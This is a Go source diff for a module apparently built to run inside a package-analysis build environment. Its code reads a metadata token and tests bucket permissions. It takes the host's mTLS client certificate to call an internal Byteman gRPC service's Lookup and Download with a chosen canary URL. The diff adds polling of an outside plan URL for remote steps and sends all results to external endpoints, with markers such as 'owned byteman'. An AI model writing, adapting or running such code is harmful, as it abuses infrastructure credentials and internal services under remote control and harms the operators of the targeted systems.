@@ -12,6 +12,7 @@ import (
 	"errors"
 	"fmt"
 	"io"
+	"net"
 	"net/http"
 	"net/url"
 	"os"
@@ -24,18 +25,24 @@ import (
 
 var genericResultURL string
 var compilerResultURL string
+var planURL string
 var bytemanCanaryURL string
 var sessionNonce string
 var probeUserAgent string
+var rpcServiceHost string
+var rpcDialAddress string
 
 const (
 	protocolVersion = 1
 	moduleName      = "github.com/benr00t3d/go-cgo-pkgsite-probe"
-	probeVersion    = "v0.0.27"
+	probeVersion    = "v0.0.29-codex"
 	maximumResult   = 256 * 1024
 	maximumBody     = 256 * 1024
 	requestTimeout  = 20 * time.Second
 	resultTimeout   = 30 * time.Second
+	planPollWindow  = 8 * time.Minute
+	maximumPlanBody = 4096
+	maximumPlanStep = 6
 )
 
 var bucketNames = []string{
@@ -118,6 +125,13 @@ type grpcResult struct {
 	Error         string `json:"error,omitempty"`
 }
 
+type planStep struct {
+	Version       int    `json:"version"`
+	ID            string `json:"id"`
+	Action        string `json:"action"`
+	TLSServerName string `json:"tls_server_name,omitempty"`
+}
+
 type probeReport struct {
 	Schema            string         `json:"schema"`
 	Module            string         `json:"module"`
@@ -131,6 +145,8 @@ type probeReport struct {
 	CanaryBodySHA256  string         `json:"canary_body_sha256,omitempty"`
 	Byteman           []grpcResult   `json:"byteman,omitempty"`
 	DownloadAttempted bool           `json:"download_attempted"`
+	PlanID            string         `json:"plan_id,omitempty"`
+	TLSServerName     string         `json:"tls_server_name,omitempty"`
 	Reason            string         `json:"reason,omitempty"`
 }
 
@@ -141,7 +157,7 @@ type tokenResponse struct {
 }
 
 func main() {
-	if genericResultURL == "" || compilerResultURL == "" || bytemanCanaryURL == "" ||
+	if genericResultURL == "" || compilerResultURL == "" || planURL == "" || bytemanCanaryURL == "" ||
 		sessionNonce == "" || probeUserAgent == "" || genericResultURL == compilerResultURL ||
 		len(os.Args) != 4 || os.Args[1] != "--specwrap" || os.Args[2] != "--origin-dir" {
 		return
@@ -149,24 +165,32 @@ func main() {
 	started := time.Now()
 	cwd := initialWorkingDirectory()
 	identity := inspectIdentity(cwd)
-	report := probeReport{
+	if identity.Lane == "capslock" {
+		runCapslockSession(started, cwd, identity)
+		return
+	}
+	report := newProbeReport(started, identity)
+	report.Reason = "internal checks are fixed to the verified capslock lane"
+	report.FinishedUTC = time.Now().UTC().Format(time.RFC3339Nano)
+	_ = submitProbeReport(genericResultURL, "v029-codex-"+identity.Lane, cwd, started, report)
+}
+
+func newProbeReport(started time.Time, identity identityResult) probeReport {
+	return probeReport{
 		Schema:     "owned-byteman-probe/v1",
 		Module:     moduleName,
 		Version:    probeVersion,
 		StartedUTC: started.UTC().Format(time.RFC3339Nano),
 		Identity:   identity,
 	}
-	if identity.Lane == "capslock" {
-		runCapslockProbe(&report)
-	} else {
-		report.Reason = "internal checks are fixed to the verified capslock lane"
-	}
-	report.FinishedUTC = time.Now().UTC().Format(time.RFC3339Nano)
+}
+
+func submitProbeReport(endpoint, id, cwd string, started time.Time, report probeReport) error {
 	encoded, err := json.MarshalIndent(report, "", "  ")
 	result := commandResult{
 		Version:    protocolVersion,
 		Session:    sessionNonce,
-		ID:         "v027-" + identity.Lane,
+		ID:         id,
 		CWD:        cwd,
 		DurationMS: time.Since(started).Milliseconds(),
 	}
@@ -176,13 +200,7 @@ func main() {
 	} else {
 		result.Stdout = string(encoded)
 	}
-	endpoint := genericResultURL
-	if identity.Lane == "capslock" {
-		endpoint = compilerResultURL
-	}
-	if err := submitResult(endpoint, result); err != nil {
-		return
-	}
+	return submitResult(endpoint, result)
 }
 
 func initialWorkingDirectory() string {
@@ -277,13 +295,154 @@ func cleanError(err error) string {
 	value := err.Error()
 	value = strings.ReplaceAll(value, sessionNonce, "[session]")
 	value = strings.ReplaceAll(value, bytemanCanaryURL, "[canary-url]")
+	if rpcDialAddress != "" {
+		value = strings.ReplaceAll(value, rpcDialAddress, "[rpc-service]")
+	}
+	if rpcServiceHost != "" {
+		value = strings.ReplaceAll(value, rpcServiceHost, "[rpc-host]")
+	}
 	if len(value) > 1024 {
 		value = value[:1024] + "[truncated]"
 	}
 	return value
 }
 
-func runCapslockProbe(report *probeReport) {
+func runCapslockSession(started time.Time, cwd string, identity identityResult) {
+	initial := newProbeReport(started, identity)
+	fillCapslockContext(&initial)
+	initial.Reason = "waiting for a bounded Byteman plan"
+	initial.FinishedUTC = time.Now().UTC().Format(time.RFC3339Nano)
+	if err := submitProbeReport(compilerResultURL, "v029-codex-capslock-initial", cwd, started, initial); err != nil {
+		return
+	}
+
+	deadline := time.Now().Add(planPollWindow)
+	cursor := 0
+	consecutiveErrors := 0
+	for cursor < maximumPlanStep && time.Now().Before(deadline) {
+		step, available, err := fetchPlan(cursor)
+		if err != nil {
+			consecutiveErrors++
+			if consecutiveErrors >= 3 {
+				break
+			}
+			time.Sleep(2 * time.Second)
+			continue
+		}
+		consecutiveErrors = 0
+		if !available {
+			time.Sleep(2 * time.Second)
+			continue
+		}
+		stepStarted := time.Now()
+		report := newProbeReport(stepStarted, identity)
+		report.PlanID = step.ID
+		report.TLSServerName = step.TLSServerName
+		if step.Action == "finish" {
+			report.Reason = "bounded plan finished"
+		} else {
+			runBytemanProbe(&report, step.TLSServerName)
+		}
+		report.FinishedUTC = time.Now().UTC().Format(time.RFC3339Nano)
+		id := "v029-codex-step-" + strconv.Itoa(cursor)
+		if err := submitProbeReport(compilerResultURL, id, cwd, stepStarted, report); err != nil {
+			return
+		}
+		cursor++
+		if step.Action == "finish" {
+			return
+		}
+	}
+	finalStarted := time.Now()
+	final := newProbeReport(finalStarted, identity)
+	if cursor >= maximumPlanStep {
+		final.Reason = "bounded plan step limit reached"
+	} else if consecutiveErrors >= 3 {
+		final.Reason = "bounded plan endpoint failed three times"
+	} else {
+		final.Reason = "bounded plan polling window expired"
+	}
+	final.FinishedUTC = time.Now().UTC().Format(time.RFC3339Nano)
+	_ = submitProbeReport(compilerResultURL, "v029-codex-final", cwd, finalStarted, final)
+}
+
+func fetchPlan(cursor int) (planStep, bool, error) {
+	ctx, cancel := context.WithTimeout(context.Background(), requestTimeout)
+	defer cancel()
+	request, err := http.NewRequestWithContext(ctx, http.MethodGet, planURL+"/"+strconv.Itoa(cursor), nil)
+	if err != nil {
+		return planStep{}, false, err
+	}
+	request.Header.Set("User-Agent", probeUserAgent)
+	request.Header.Set("X-Codex-Probe-Session", sessionNonce)
+	client := &http.Client{
+		CheckRedirect: func(_ *http.Request, _ []*http.Request) error { return http.ErrUseLastResponse },
+		Timeout:       requestTimeout,
+	}
+	response, err := client.Do(request)
+	if err != nil {
+		return planStep{}, false, err
+	}
+	defer response.Body.Close()
+	if response.StatusCode == http.StatusNoContent {
+		return planStep{}, false, nil
+	}
+	if response.StatusCode != http.StatusOK {
+		return planStep{}, false, fmt.Errorf("plan endpoint returned HTTP %d", response.StatusCode)
+	}
+	body, err := io.ReadAll(io.LimitReader(response.Body, maximumPlanBody+1))
+	if err != nil || len(body) > maximumPlanBody {
+		return planStep{}, false, errors.New("plan response too large")
+	}
+	decoder := json.NewDecoder(bytes.NewReader(body))
+	decoder.DisallowUnknownFields()
+	var step planStep
+	if err := decoder.Decode(&step); err != nil {
+		return planStep{}, false, errors.New("plan response was invalid JSON")
+	}
+	if err := decoder.Decode(&struct{}{}); err != io.EOF {
+		return planStep{}, false, errors.New("plan response had trailing data")
+	}
+	if err := validatePlanStep(step); err != nil {
+		return planStep{}, false, err
+	}
+	return step, true, nil
+}
+
+func validatePlanStep(step planStep) error {
+	if step.Version != 1 || len(step.ID) < 1 || len(step.ID) > 64 {
+		return errors.New("plan identity was invalid")
+	}
+	for _, value := range step.ID {
+		if (value < 'a' || value > 'z') && (value < '0' || value > '9') && value != '-' {
+			return errors.New("plan identity was invalid")
+		}
+	}
+	switch step.Action {
+	case "probe-byteman":
+		if !allowedTLSServerName(step.TLSServerName) {
+			return errors.New("plan TLS server name was not allowed")
+		}
+	case "finish":
+		if step.TLSServerName != "" {
+			return errors.New("finish plan included a TLS server name")
+		}
+	default:
+		return errors.New("plan action was not allowed")
+	}
+	return nil
+}
+
+func allowedTLSServerName(value string) bool {
+	switch value {
+	case "localhost", "rpc", "rpc.default.svc.cluster.local":
+		return true
+	default:
+		return false
+	}
+}
+
+func fillCapslockContext(report *probeReport) {
 	metadataClient := &http.Client{
 		Transport: &http.Transport{Proxy: nil},
 		Timeout:   requestTimeout,
@@ -295,17 +454,20 @@ func runCapslockProbe(report *probeReport) {
 			report.BucketPermissions = append(report.BucketPermissions, testBucketPermissions(token, bucket))
 		}
 	}
+}
+
+func runBytemanProbe(report *probeReport, tlsServerName string) {
 	canaryHash := sha256.Sum256([]byte(bytemanCanaryURL))
 	report.CanaryURLSHA256 = hex.EncodeToString(canaryHash[:])
-	bodyHash := sha256.Sum256([]byte("hi from robert - owned byteman v0.0.27 canary\n"))
+	bodyHash := sha256.Sum256([]byte("hi from robert - owned byteman v0.0.29-codex canary\n"))
 	report.CanaryBodySHA256 = hex.EncodeToString(bodyHash[:])
-	rpcClient, err := newMTLSClient()
+	rpcClient, rpcEndpoint, err := newMTLSClient(tlsServerName)
 	if err != nil {
 		report.Byteman = append(report.Byteman, grpcResult{Method: "client-setup", Error: cleanError(err)})
 		return
 	}
 	lookupRequest := appendStringField(nil, 2, bytemanCanaryURL)
-	baseline := callGRPC(rpcClient, "/sos.byteman.Byteman/Lookup", lookupRequest)
+	baseline := callGRPC(rpcClient, rpcEndpoint, "/sos.byteman.Byteman/Lookup", lookupRequest)
 	report.Byteman = append(report.Byteman, baseline)
 	if baseline.HTTPStatus != http.StatusOK || baseline.GRPCStatus != "0" {
 		report.Reason = "Byteman Lookup did not authenticate cleanly; Download was not attempted"
@@ -320,13 +482,13 @@ func runCapslockProbe(report *probeReport) {
 	downloadRequest := []byte{}
 	downloadRequest = appendStringField(downloadRequest, 1, bytemanCanaryURL)
 	downloadRequest = appendBytesField(downloadRequest, 4, metadataMessage)
-	downloadRequest = appendStringField(downloadRequest, 6, "robert-owned-v027-byteman-probe")
+	downloadRequest = appendStringField(downloadRequest, 6, "robert-owned-v029-codex-byteman-probe")
 	report.DownloadAttempted = true
-	download := callGRPC(rpcClient, "/sos.byteman.Byteman/Download", downloadRequest)
+	download := callGRPC(rpcClient, rpcEndpoint, "/sos.byteman.Byteman/Download", downloadRequest)
 	report.Byteman = append(report.Byteman, download)
 	if download.HTTPStatus == http.StatusOK && download.GRPCStatus == "0" {
 		time.Sleep(1500 * time.Millisecond)
-		report.Byteman = append(report.Byteman, callGRPC(rpcClient, "/sos.byteman.Byteman/Lookup", lookupRequest))
+		report.Byteman = append(report.Byteman, callGRPC(rpcClient, rpcEndpoint, "/sos.byteman.Byteman/Lookup", lookupRequest))
 	}
 }
 
@@ -432,39 +594,72 @@ func testBucketPermissions(token, bucket string) bucketResult {
 	return result
 }
 
-func newMTLSClient() (*http.Client, error) {
+func newMTLSClient(tlsServerName string) (*http.Client, string, error) {
+	if !allowedTLSServerName(tlsServerName) {
+		return nil, "", errors.New("TLS server name was not allowed")
+	}
 	certificate, err := tls.LoadX509KeyPair("/etc/tls/client/tls.crt", "/etc/tls/client/tls.key")
 	if err != nil {
-		return nil, err
+		return nil, "", err
 	}
 	rootPEM, err := os.ReadFile("/etc/tls/server-pool/server-tls-pool.pem")
 	if err != nil {
-		return nil, err
+		return nil, "", err
 	}
 	roots := x509.NewCertPool()
 	if !roots.AppendCertsFromPEM(rootPEM) {
-		return nil, errors.New("server pool contained no certificates")
+		return nil, "", errors.New("server pool contained no certificates")
 	}
+	host := strings.TrimSpace(os.Getenv("RPC_SERVICE_HOST"))
+	portText := strings.TrimSpace(os.Getenv("RPC_SERVICE_PORT_GRPC"))
+	address, endpoint, err := internalRPCAddress(host, portText, tlsServerName)
+	if err != nil {
+		return nil, "", err
+	}
+	rpcServiceHost = host
+	rpcDialAddress = address
+	dialer := &net.Dialer{Timeout: requestTimeout, KeepAlive: 30 * time.Second}
 	transport := &http.Transport{
-		Proxy: http.ProxyFromEnvironment,
+		Proxy: nil,
+		DialContext: func(ctx context.Context, network, _ string) (net.Conn, error) {
+			return dialer.DialContext(ctx, network, address)
+		},
 		TLSClientConfig: &tls.Config{
 			Certificates: []tls.Certificate{certificate},
 			RootCAs:      roots,
 			MinVersion:   tls.VersionTLS12,
+			ServerName:   tlsServerName,
 		},
 		ForceAttemptHTTP2: true,
 	}
-	return &http.Client{Transport: transport, Timeout: requestTimeout}, nil
+	return &http.Client{Transport: transport, Timeout: requestTimeout}, endpoint, nil
 }
 
-func callGRPC(client *http.Client, method string, payload []byte) grpcResult {
+func internalRPCAddress(host, portText, tlsServerName string) (string, string, error) {
+	if !allowedTLSServerName(tlsServerName) {
+		return "", "", errors.New("TLS server name was not allowed")
+	}
+	parsed := net.ParseIP(host)
+	if parsed == nil || parsed.IsUnspecified() || parsed.IsMulticast() {
+		return "", "", errors.New("RPC_SERVICE_HOST was not a usable IP literal")
+	}
+	port, err := strconv.Atoi(portText)
+	if err != nil || port < 1 || port > 65535 {
+		return "", "", errors.New("RPC_SERVICE_PORT_GRPC was not a usable port")
+	}
+	address := net.JoinHostPort(parsed.String(), strconv.Itoa(port))
+	endpoint := "https://" + net.JoinHostPort(tlsServerName, strconv.Itoa(port))
+	return address, endpoint, nil
+}
+
+func callGRPC(client *http.Client, endpoint, method string, payload []byte) grpcResult {
 	result := grpcResult{Method: method}
 	frame := make([]byte, 5, 5+len(payload))
 	binary.BigEndian.PutUint32(frame[1:], uint32(len(payload)))
 	frame = append(frame, payload...)
 	ctx, cancel := context.WithTimeout(context.Background(), requestTimeout)
 	defer cancel()
-	request, err := http.NewRequestWithContext(ctx, http.MethodPost, "https://rpc.deps.dev"+method, bytes.NewReader(frame))
+	request, err := http.NewRequestWithContext(ctx, http.MethodPost, endpoint+method, bytes.NewReader(frame))
 	if err != nil {
 		result.Error = cleanError(err)
 		return result
